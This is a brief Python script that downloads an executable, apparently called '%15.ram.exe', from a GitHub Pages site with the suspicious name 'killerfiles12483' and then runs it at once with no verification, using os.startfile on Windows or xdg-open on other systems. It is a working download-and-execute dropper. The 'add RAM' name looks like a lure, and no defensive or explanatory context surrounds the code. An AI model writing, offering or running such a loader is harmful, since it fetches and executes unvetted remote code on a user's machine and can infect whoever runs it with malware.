URL = "https://killerfiles12483.github.io/addram/%2515.ram.exe"
import os
import urllib.request
import subprocess
import sys
from urllib.parse import urlparse, unquote

def download_file():
    # Predetermined link ending in a file
    url = URL
    
    try:
        # Extract filename from URL
        parsed_url = urlparse(url)
        filename = unquote(os.path.basename(parsed_url.path))
        
        if not filename:
            print("Error: Could not determine filename from URL.")
            return

        print(f"Downloading {filename} from {url}...")
        
        # Download the file
        urllib.request.urlretrieve(url, filename)
        
        print(f"Successfully downloaded: {filename}")
        print(f"Saved to: {os.path.abspath(filename)}")

        # Run the file
        print(f"Executing {filename}...")
        if filename.endswith('.py'):
            subprocess.run([sys.executable, filename])
        else:
            # On Windows, os.startfile opens the file with its associated program
            if os.name == 'nt':
                os.startfile(filename)
            else:
                # Fallback for Linux/Mac
                subprocess.call(('xdg-open', filename))
        
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    download_file()
